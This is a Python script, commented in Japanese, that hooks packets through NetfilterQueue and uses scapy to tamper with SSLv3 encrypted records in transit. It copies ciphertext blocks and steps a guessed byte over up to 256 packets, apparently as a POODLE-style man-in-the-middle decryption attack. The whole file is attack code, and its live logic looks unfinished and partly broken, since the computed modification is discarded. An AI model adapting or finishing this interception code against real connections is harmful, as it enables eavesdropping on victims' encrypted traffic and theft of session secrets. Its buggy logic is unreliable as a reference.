from collections import deque
from netfilterqueue import NetfilterQueue
import sys
from scapy.all import *
from scapy.layers.tls.all import TLS
from scapy.layers.http import *
from scapy.layers.tls import *
from scapy.all import IP, TCP
from scapy.layers.inet import IP, TCP, ICMP

config = json.load(open('../config.json'))


def get_field(layer, field_name):
    return layer.get_field(field_name).i2repr(layer, getattr(layer, field_name))


def get_tls_field(packet_bytes, field_name):
    """
    TLSヘッダーから特定のフィールド値を取得する関数。
    """
    if field_name == "type":
        return packet_bytes[0]  # 最初の1バイトがTLSのContent Type
    elif field_name == "version":
        return packet_bytes[1:3]  # 2〜3バイトがTLSのバージョン
    elif field_name == "length":
        # 4〜5バイトがペイロードの長さ
        return int.from_bytes(packet_bytes[3:5], byteorder='big')
    return None


def is_sslv3_packet(pkt):
    # TCPがなければ判定できない
    if TCP not in pkt:
        return False

    payload = bytes(pkt[TCP].payload)

    # ペイロードが短すぎる場合は無効
    if len(payload) < 3:
        return False

    SSLV3_VERSION = b'\x03\x00'

    content_type = payload[0]
    version = payload[1:3]

    if content_type not in [20, 21, 22, 23]:  # ハンドシェイクなどのタイプ
        return False

    if version != SSLV3_VERSION:
        return False

    return True


def is_tls_packet(pkt):
    if TCP not in pkt:
        return False

    payload = bytes(pkt[TCP].payload)

    # ペイロードの最小サイズ確認
    if len(payload) < 5:
        return False

    # TLSフィールドを確認
    content_type = payload[0]
    version = payload[1:3]

    if content_type not in [20, 21, 22, 23]:  # TLS Content Type
        return False

    # SSLv3, TLS1.0, 1.1, 1.2
    if version not in [b'\x03\x00', b'\x03\x01', b'\x03\x02', b'\x03\x03']:
        return False

    return True


packet_count = 0
previous_packet_tls_payload = None
last_byte_of_the_penultimate_block = 0x00


# def attack_callback(packet):
#    global packet_count
#    global previous_packet_tls_payload
#    global last_byte_of_the_penultimate_block
#
#    pkt = IP(packet.get_payload())
#    pkt.show()
#
#    if ICMP in pkt or pkt[TCP].flags == "RA":  # TCP再送信フラグチェック
#        packet.accept()
#        return
#
#    tls_layer_bytes = bytes(pkt[TCP].payload)
#    if not is_tls_packet(pkt):
#        packet.accept()
#        return
#
#    if not is_sslv3_packet(pkt):
#        packet.accept()
#        return
#
#    if pkt.src == config['target']:
#        packet.accept()
#        return
#
#    tls_layer_bytes = bytes(pkt.getlayer(TLS))
#    tls_type = get_tls_field(tls_layer_bytes, "type")
#
#    if tls_type == 23:
#        if packet_count == 0:
#            print("first packet")
#            previous_packet_tls_payload = bytes(pkt.getlayer('TLS'))[5:]
#            packet.accept()
#            packet_count += 1
#            return
#        elif packet_count <= 256:
#            last_byte_of_the_penultimate_block += 1
#            # print(f"0x{last_byte_of_the_penultimate_block:02x}")
#            hexdump(pkt.payload)
#            current_packet_tls_header = bytes(pkt.getlayer('TLS'))[:5]
#            current_packet_tls_payload = bytes(pkt.getlayer('TLS'))[5:]
#
#            # ブロックサイズ（例: 8バイト固定）
#            block_size = 8
#
#            # 真ん中のブロックを切り出し
#            payload_length = len(current_packet_tls_payload)
#            middle_index = payload_length // 2
#            start_index = (middle_index // block_size) * \
#                block_size  # ブロックの開始位置を調整
#            current_packet_tls_payload_middle_block = current_packet_tls_payload[
#                start_index:start_index + block_size]
#
#            # 最後のブロックを真ん中のブロックに置き換え
#            current_packet_tls_payload_modified = (
#                current_packet_tls_payload[:-(block_size+1)] +
#                bytes(last_byte_of_the_penultimate_block) +
#                current_packet_tls_payload_middle_block
#            )
#            print("-----------------------------------")
#            hexdump(bytes(last_byte_of_the_penultimate_block))
#            print(f"0x{last_byte_of_the_penultimate_block:02x}")
#            print("-----------------------------------")
#
#            # 新しいペイロードを作成
#            new_payload = current_packet_tls_header + current_packet_tls_payload_modified
#
#            pkt[TCP].remove_payload()
#            pkt[TCP].add_payload(new_payload)
#            del pkt[TCP].chksum
#            del pkt[IP].chksum
#
#            packet.set_payload(bytes(pkt))
#            print(packet_count)
#            packet_count += 1
#            packet.accept()
#            return
#
#    print("hoge")
#    packet.accept()
#    return


# 追跡用の辞書とキューを初期化
processed_packets = {}
max_tracked_packets = 1000  # トラッキングする最大パケット数
tracking_queue = deque()  # FIFOで古いエントリを削除


def attack_callback(packet):
    global packet_count
    global previous_packet_tls_payload
    global last_byte_of_the_penultimate_block
    global processed_packets
    global tracking_queue

    pkt = IP(packet.get_payload())

    if ICMP in pkt or pkt[TCP].flags == "RA":  # TCP再送信フラグチェック
        packet.accept()
        return

    # TCPシーケンス番号とACK番号を取得
    tcp_seq = pkt[TCP].seq
    tcp_ack = pkt[TCP].ack
    packet_key = (tcp_seq, tcp_ack)

    # 再送信チェック
    if packet_key in processed_packets:
        # print(f"Duplicate packet detected: seq={tcp_seq}, ack={tcp_ack}")
        packet.accept()
        return

    # 新しいパケットとしてトラッキング
    processed_packets[packet_key] = True
    tracking_queue.append(packet_key)

    # トラッキング辞書が大きくなりすぎた場合は古いエントリを削除
    if len(tracking_queue) > max_tracked_packets:
        oldest_packet_key = tracking_queue.popleft()
        del processed_packets[oldest_packet_key]

    tls_layer_bytes = bytes(pkt[TCP].payload)
    if not is_tls_packet(pkt):
        packet.accept()
        return

    if not is_sslv3_packet(pkt):
        packet.accept()
        return

    if pkt.src == config['target']:
        packet.accept()
        return

    tls_layer_bytes = bytes(pkt.getlayer(TLS))
    tls_type = get_tls_field(tls_layer_bytes, "type")

    if tls_type == 23:
        # print(f"0x{last_byte_of_the_penultimate_block:02x}")
        if packet_count == 0:
            previous_packet_tls_payload = bytes(pkt.getlayer('TLS'))[29:]
            packet.accept()
            packet_count += 1
            return
        elif packet_count <= 256:
            print("packet_count", packet_count)
            last_byte_of_the_penultimate_block += 1
            current_packet_tls_header = bytes(pkt.getlayer('TLS'))[:29]
            current_packet_tls_payload = bytes(pkt.getlayer('TLS'))[29:]

            print(len(bytes(pkt.getlayer('TLS')))-29)

            block_size = 8

            # 真ん中のブロックを切り出し
            payload_length = len(current_packet_tls_payload)
            middle_index = payload_length // 2
            start_index = (middle_index // block_size) * \
                block_size  # ブロックの開始位置を調整
            current_packet_tls_payload_middle_block = current_packet_tls_payload[
                start_index:start_index + block_size]

            # 最後のブロックを真ん中のブロックに置き換え
            current_packet_tls_payload_modified = (
                current_packet_tls_payload[:-(block_size+1)] +
                bytes(last_byte_of_the_penultimate_block) +
                current_packet_tls_payload_middle_block
            )

            # 新しいペイロードを作成
            # new_payload = current_packet_tls_header + current_packet_tls_payload_modified
            new_payload = current_packet_tls_header + previous_packet_tls_payload

            current_packet_first_application_data = bytes(
                pkt.getlayer('TLS'))[:29]
            current_packet_second_application_data_tls_header = bytes(pkt.getlayer('TLS'))[
                29:34]
            current_packet_second_application_data_tls_payload = bytes(pkt.getlayer('TLS'))[34:]

            new_payload = current_packet_first_application_data + current_packet_second_application_data_tls_header + current_packet_second_application_data_tls_payload

            pkt[TCP].remove_payload()
            pkt[TCP].add_payload(new_payload)
            del pkt[TCP].chksum
            del pkt[IP].chksum

            packet.set_payload(bytes(pkt))
            packet_count += 1
            packet.accept()
            return

    packet.accept()
    return


try:
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, attack_callback)
#    server.serve_forever()
    nfqueue.run()
except KeyboardInterrupt:
    pass

nfqueue.unbind()
# server.server_close()
